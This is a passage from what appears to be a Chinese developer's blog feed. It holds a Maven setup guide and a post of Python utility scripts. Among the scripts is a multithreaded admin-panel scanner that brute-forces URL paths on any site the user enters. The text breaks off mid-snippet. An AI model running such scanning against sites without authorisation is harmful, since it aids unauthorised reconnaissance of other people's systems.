class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- localRepository</span></span><br><span class="line"><span class="comment"> | The path to the local repository maven will use to store artifacts.</span></span><br><span class="line"><span class="comment"> |</span></span><br><span class="line"><span class="comment"> | Default: $&#123;user.home&#125;/.m2/repository</span></span><br><span class="line"><span class="comment">&lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>位置改为自己本机指定目录，<code>/</code>不要写反。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:/apache-maven-3.8.4/repo<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="修改仓库源"><a href="#修改仓库源" class="headerlink" title="修改仓库源"></a>修改仓库源</h3><p><a href="https://developer.aliyun.com/mvn/guide">https://developer.aliyun.com/mvn/guide</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h3><p>进入项目的根目录</p><p>编译java文件 <code>mvn xxx</code></p><p>执行main方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn exec:java <span class="literal">-Dexec</span>.mainClass=<span class="string">&quot;com.xxx.xxx.TextDemo(类名)&quot;</span></span><br></pre></td></tr></table></figure><p>报错：</p><ol><li>不是使用管理员权限</li><li>JDK环境配置问题</li><li>包名类名路径错误</li></ol><h1 id="Maven命令"><a href="#Maven命令" class="headerlink" title="Maven命令"></a>Maven命令</h1><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>mvn -v, –version</td><td>显示版本信息</td></tr><tr><td>mvn clean</td><td>清除产生的项目</td></tr><tr><td>mvn package</td><td>打包</td></tr><tr><td>mvn test</td><td>运行测试</td></tr><tr><td>mvn compile</td><td>编译源代码</td></tr><tr><td>mvn install</td><td>在本地 Repository 中安装 jar</td></tr><tr><td>mvn deploy</td><td>将打包文件发布到远程参考</td></tr><tr><td>mvn site</td><td>生成项目相关信息的网站</td></tr><tr><td>mvn eclipse:eclipse</td><td>生成eclipse项目，idea同理</td></tr><tr><td>mvn dependency:tree</td><td>打印整个依赖树</td></tr></tbody></table><h1 id="IDEA编辑器集成Maven环境"><a href="#IDEA编辑器集成Maven环境" class="headerlink" title="IDEA编辑器集成Maven环境"></a>IDEA编辑器集成Maven环境</h1><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227192352962.png" alt="image-20211227192352962"></p><p>设置配置文件路径和本地仓库路径</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227193905949.png" alt="image-20211227193905949"></p><h1 id="Maven创建项目"><a href="#Maven创建项目" class="headerlink" title="Maven创建项目"></a>Maven创建项目</h1><h2 id="创建Java项目"><a href="#创建Java项目" class="headerlink" title="创建Java项目"></a>创建Java项目</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227194320510.png" alt="image-20211227194320510"></p><p>设置项目名称和路径</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227194418411.png" alt="image-20211227194418411"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227200053102.png" alt="image-20211227200053102"></p><h4 id="设置目录结构"><a href="#设置目录结构" class="headerlink" title="设置目录结构"></a>设置目录结构</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203035330.png" alt="image-20211227203035330"></p><h4 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227204151806.png" alt="image-20211227204151806"></p><h4 id="打包成jar包"><a href="#打包成jar包" class="headerlink" title="打包成jar包"></a>打包成jar包</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203914718.png" alt="image-20211227203914718"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203810302.png" alt="image-20211227203810302"></p><h2 id="创建web项目"><a href="#创建web项目" class="headerlink" title="创建web项目"></a>创建web项目</h2><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>模板选择webapp</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227204406928.png" alt="image-20211227204406928"></p><h4 id="修改jdk版本"><a href="#修改jdk版本" class="headerlink" title="修改jdk版本"></a>修改jdk版本</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="设置单元测试版本为4-12"><a href="#设置单元测试版本为4-12" class="headerlink" title="设置单元测试版本为4.12"></a>设置单元测试版本为4.12</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="删除pluginManagement标签"><a href="#删除pluginManagement标签" class="headerlink" title="删除pluginManagement标签"></a>删除pluginManagement标签</h4><p><code>&lt;pluginManagement...&gt;</code></p><h4 id="设置web插件"><a href="#设置web插件" class="headerlink" title="设置web插件"></a>设置web插件</h4><p>jetty</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--jetty--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jetty-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--热部署，每10s扫描一次--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scanIntervalSeconds</span>&gt;</span>10<span class="tag">&lt;/<span class="name">scanIntervalSeconds</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--项目站点路径--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/abc<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">connector</span> <span class="attr">implementation</span>=<span class="string">&quot;org.mortbay.jetty.nio.SelectChannelConnector&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">port</span>&gt;</span>9090<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">path</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">uriEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">uriEncoding</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">server</span>&gt;</span>tomcat7<span class="tag">&lt;/<span class="name">server</span>&gt;</span> <span class="comment">&lt;!--服务器名称--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227223615824.png" alt="image-20211227223615824"></p><p>或者注释<code>&lt;connector&gt;</code>在<code>command line</code>中填写<code>jetty:run -Djetty.port=8899</code></p><h1 id="mvnrepository"><a href="#mvnrepository" class="headerlink" title="mvnrepository"></a>mvnrepository</h1><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227231748408.png" alt="image-20211227231748408"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227231733712.png" alt="image-20211227231733712"></p><h1 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h1><p>扫描漏洞类插件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行<code>mvn verify</code>，结果如下：</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220106164052970.png" alt="image-20220106164052970"></p><h1 id="安装第三方JAR"><a href="#安装第三方JAR" class="headerlink" title="安装第三方JAR"></a>安装第三方JAR</h1><p><a href="https://maven.apache.org/guides/mini/guide-3rd-party-jars-local.html">官网地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile=&lt;path-to-file&gt; -DgroupId=&lt;group-id&gt; -DartifactId=&lt;artifact-id&gt; -Dversion=&lt;version&gt; -Dpackaging=&lt;packaging&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;path-to-file&gt;</code>为你jar包所在的路径<br><code>&lt;group-id&gt;</code>为grouId号，与<code>&lt;artifact-id&gt;</code>组成唯一识别你jar包的坐标，当不在公共资源jar包中，自己自定义的jar时，可以自定义groupId号<br><code>&lt;artifact-id&gt;</code>为artifactId号，与<code>&lt;group-id&gt;</code>组成唯一识别你jar包的坐标，当不在公共资源jar包中，自己自定义的jar时，可以自定义artifactId号<br><code>&lt;version&gt;</code>jar包版本号，也可以自定义<br><code>&lt;packaging&gt;</code>包的后缀，一般都是jar</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="maven缺失ojdbc6解决方案"><a href="#maven缺失ojdbc6解决方案" class="headerlink" title="maven缺失ojdbc6解决方案"></a>maven缺失ojdbc6解决方案</h2><p>在<strong>cmd</strong>命令行输入以下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile=D:/MavenRepo/ojdbc6.jar -DgroupId=com.oracle -DartifactId=ojdbc6 -Dversion=<span class="number">11</span>.<span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span> -Dpackaging=jar -DgeneratePom=true</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220107154533805.png" alt="image-20220107154533805"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python常用方法脚本</title>
      <link href="/p/7b3ac767.html"/>
      <url>/p/7b3ac767.html</url>
      
        <content type="html"><![CDATA[<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><h2 id="base64编码导成二进制文件"><a href="#base64编码导成二进制文件" class="headerlink" title="base64编码导成二进制文件"></a>base64编码导成二进制文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">clzBytecodeBase64Str = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">newstr = base64.b64decode(clzBytecodeBase64Str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(newstr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;somefile.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(newstr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输出成功&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后台扫描"><a href="#后台扫描" class="headerlink" title="后台扫描"></a>后台扫描</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = raw_input(<span class="string">&quot;输入你要扫描的网址:&quot;</span>)</span><br><span class="line">txt = raw_input(<span class="string">&quot;输入字典(php.txt):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存存在的后台地址</span></span><br><span class="line">open_url = []</span><br><span class="line">all_url = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立线程列表</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从字典中读取每一行与url组合，然后添加到all_url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_url</span>(<span class="params">url,txt</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f:</span><br><span class="line">            each = each.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            urllist = url + each</span><br><span class="line">            all_url.append(urllist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_url</span>(<span class="params">urllist</span>):</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;find：&quot;</span>+urllist+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib.urlopen(urllist)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断返回码</span></span><br><span class="line">        <span class="keyword">if</span> req.getcode() == <span class="number">200</span>:</span><br><span class="line">            open_url.append(urllist)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> req.getcode() == <span class="number">301</span>:</span><br><span class="line">            open_url.append(urllist)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    search_url(url,txt)</span><br><span class="line">    <span class="comment"># 多线程处理</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> all_url:</span><br><span class="line">        t = threading.Thread(target= handle_url, args=(each,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 线程等待</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 扫描成功和不成功的回显</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> open_url:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;扫描成功，网站后台地址为：&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> open_url:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]&quot;</span>+each)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;没有扫到网站后台，字典不给力啊&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断运行时间</span></span><br><span class="line">    start = time.clock()</span><br><span class="line">    main()</span><br><span class="line">    end = time.clock()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;The function spend time is %.3f seconds&quot;</span> %(end-start))</span><br></pre></td></tr></table></figure><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><h2 id="hex-str"><a href="#hex-str" class="headerlink" title="hex-str"></a>hex-str</h2><h3 id="1-字符串转-hex-字符串"><a href="#1-字符串转-hex-字符串" class="headerlink" title="1. 字符串转 hex 字符串"></a>1. 字符串转 hex 字符串</h3><h4 id="字符串-gt-gt-二进制-gt-gt-hex-gt-gt-hex-字符串"><a href="#字符串-gt-gt-二进制-gt-gt-hex-gt-gt-hex-字符串" class="headerlink" title="字符串 &gt;&gt; 二进制 &gt;&gt; hex &gt;&gt; hex 字符串"></a>字符串 &gt;&gt; 二进制 &gt;&gt; hex &gt;&gt; hex 字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hexStr</span>(<span class="params">string</span>):</span></span><br><span class="line">    str_bin = string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(str_bin).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-hex-字符串转字符串"><a href="#2-hex-字符串转字符串" class="headerlink" title="2. hex 字符串转字符串"></a>2. hex 字符串转字符串</h3><h4 id="hex-字符串-gt-gt-hex-gt-gt-二进制-gt-gt-字符串"><a href="#hex-字符串-gt-gt-hex-gt-gt-二进制-gt-gt-字符串" class="headerlink" title="hex 字符串 &gt;&gt; hex &gt;&gt; 二进制 &gt;&gt; 字符串"></a>hex 字符串 &gt;&gt; hex &gt;&gt; 二进制 &gt;&gt; 字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexStr_to_str</span>(<span class="params">hex_str</span>):</span></span><br><span class="line">    <span class="built_in">hex</span> = hex_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    str_bin = binascii.unhexlify(<span class="built_in">hex</span>)</span><br><span class="line">    <span class="keyword">return</span> str_bin.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="bytes-str"><a href="#bytes-str" class="headerlink" title="bytes-str"></a>bytes-str</h2><h3 id="str-gt-gt-bytes"><a href="#str-gt-gt-bytes" class="headerlink" title="str&gt;&gt;bytes"></a>str&gt;&gt;bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;demo&quot;</span></span><br><span class="line">b = a.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">b = <span class="built_in">bytes</span>(a.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">b = <span class="built_in">bytes</span>(a,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h3 id="bytes-gt-gt-str"><a href="#bytes-gt-gt-str" class="headerlink" title="bytes&gt;&gt;str"></a>bytes&gt;&gt;str</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=b.decode(<span class="string">&quot;utf-8&quot;</span>)  或  c=<span class="built_in">str</span>(b,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="十进制–十六进制"><a href="#十进制–十六进制" class="headerlink" title="十进制–十六进制"></a>十进制–十六进制</h2><h3 id="十六进制–-gt-十进制"><a href="#十六进制–-gt-十进制" class="headerlink" title="十六进制–&gt;十进制"></a>十六进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0xa&#x27;</span>,<span class="number">16</span>)         <span class="comment">#10</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;ff&#x27;</span>,<span class="number">16</span>)          <span class="comment">#255</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;f&#x27;</span>,<span class="number">16</span>)           <span class="comment">#15</span></span><br></pre></td></tr></table></figure><h3 id="十进制–-gt-十六进制"><a href="#十进制–-gt-十六进制" class="headerlink" title="十进制–&gt;十六进制"></a>十进制–&gt;十六进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">10</span>)    <span class="comment">#&#x27;0xa&#x27;</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">11</span>)    <span 